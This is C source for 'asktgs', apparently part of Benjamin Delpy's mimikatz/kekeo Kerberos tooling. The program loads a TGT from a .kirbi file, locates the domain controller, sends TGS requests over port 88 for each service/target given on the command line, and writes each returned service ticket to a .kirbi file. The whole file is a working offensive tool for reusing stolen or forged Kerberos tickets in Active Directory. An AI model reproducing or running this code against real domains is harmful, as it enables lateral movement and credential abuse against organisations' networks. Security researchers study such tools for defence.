/*	Benjamin DELPY `gentilkiwi`
http://blog.gentilkiwi.com
benjamin@gentilkiwi.com
Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "asktgs.h"

BOOL g_isAsn1Init = FALSE, g_isSockInit = FALSE, g_isKerberos = FALSE;

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	if(g_isAsn1Init = kull_m_kerberos_asn1_helper_init())
		if(g_isSockInit = kull_m_sock_startup())
			if(g_isKerberos = kull_m_kerberos_helper_init())
				status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isAsn1Init)
		g_isAsn1Init = !kull_m_kerberos_asn1_helper_term();
	if(g_isSockInit)
		g_isSockInit = !kull_m_sock_finish();
	if(g_isKerberos)
		g_isKerberos = !kull_m_kerberos_helper_term();

	return !(g_isAsn1Init || g_isSockInit || g_isKerberos);
}

int main(int argc, char * argv[])
{
	SOCKET connectSocket;
	OssBuf ossTgtBuff, TgsReq;
	KRB_CRED *cred = NULL;
	EncKrbCredPart *encCred = NULL;

	KDC_REP * TgsRep;
	EncKDCRepPart *encTgsRepPart;
	PCSTR dDomain, dKdc;

	DWORD i, len;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	PSTR pos, pService, pTarget;

	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  \n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'                                                     * * */\n\n");	

	if(argc > 2)
	{	
		if(init())
		{

			kprintf("Ticket    : %s\n", argv[1]);
			if(kull_m_file_readData(argv[1], &ossTgtBuff.value, (PDWORD) &ossTgtBuff.length))
			{
				if(!kull_m_kerberos_asn1_helper_ossDecode(KRB_CRED_PDU, &ossTgtBuff, (LPVOID *) &cred))
				{
					if(!kull_m_kerberos_asn1_helper_ossDecode(EncKrbCredPart_PDU, (OssBuf *) &cred->enc_part.cipher, (LPVOID *) &encCred))
					{
						if((cred->tickets->value.sname.name_type == KRB_NT_SRV_INST) && !_stricmp(cred->tickets->value.sname.name_string->value, "krbtgt") && cred->tickets->value.sname.name_string->next)
						{
							dDomain = cred->tickets->value.sname.name_string->next->value;
							kprintf("Service   : %s / %s @ %s\n", cred->tickets->value.sname.name_string->value, dDomain, cred->tickets->value.realm);
							if((encCred->ticket_info->value.bit_mask & pname_present) && encCred->ticket_info->value.prealm)
							{
								kprintf("Principal : %s @ %s\n", encCred->ticket_info->value.pname.name_string->value, encCred->ticket_info->value.prealm);
								i = DsGetDcName(NULL, dDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
								if(i == ERROR_SUCCESS)
								{
									dKdc = cInfo->DomainControllerName + 2;
									if(kull_m_sock_initSocket(dKdc, 88, &connectSocket))
									{
										for(i = 2; i < (DWORD) argc; i++)
										{
											kprintf("\n> %s\n", argv[i]);
											if((pos = strchr(argv[i], '/')) && (pos != argv[i]) && *(pos + 1))
											{
												pService = argv[i];
												pTarget = pos + 1;
												*pos = '\0';
												if(kull_m_kerberos_asn1_helper_build_KdcReq(encCred->ticket_info->value.pname.name_string->value, encCred->ticket_info->value.prealm, &encCred->ticket_info->value.key, pService, pTarget, dDomain, FALSE, &cred->tickets->value, NULL, &TgsReq))
												{
													if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
													{
														if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(TgsRep, &encTgsRepPart, &encCred->ticket_info->value.key, EncTGSRepPart_PDU))
														{
															*pos = '.';
															len = strlen(argv[i]);
															if(pos = (PSTR) LocalAlloc(LPTR, len + 7))
															{
																RtlCopyMemory(pos, argv[i], len);
																RtlCopyMemory(pos + len, ".kirbi", 6);
																kull_m_kerberos_helper_util_SaveRepAsKrbCred(TgsRep, encTgsRepPart, pos);
																LocalFree(pos);
															}
															kull_m_kerberos_asn1_helper_ossFreePDU(EncTGSRepPart_PDU, encTgsRepPart);
														}
														kull_m_kerberos_asn1_helper_ossFreePDU(TGS_REP_PDU, TgsRep);
													}
													kull_m_kerberos_asn1_helper_ossFreeBuf(TgsReq.value);
												}
											}
											else PRINT_ERROR("Incorrect format\n");
										}
										kull_m_sock_termSocket(&connectSocket);
									}
									NetApiBufferFree(cInfo);
								}
								else PRINT_ERROR("  [KDC] DsGetDcName: %u\n", i);
							}
						}
						kull_m_kerberos_asn1_helper_ossFreePDU(EncKrbCredPart_PDU, encCred);
					}
					else PRINT_ERROR("(cred) %s", kull_m_kerberos_asn1_helper_ossGetErrMsg());
					kull_m_kerberos_asn1_helper_ossFreePDU(KRB_CRED_PDU, cred);
				}
				else PRINT_ERROR("%s", kull_m_kerberos_asn1_helper_ossGetErrMsg());
				LocalFree(ossTgtBuff.value);
			}
			else PRINT_ERROR_AUTO("kull_m_file_readData");
			term();
		}
		else PRINT_ERROR("init() failed\n");
	}
	else PRINT_ERROR("Usage : %s tgt.kirbi service/target.domain.local [ ... ]\n", argv[0]);
	return 0;
}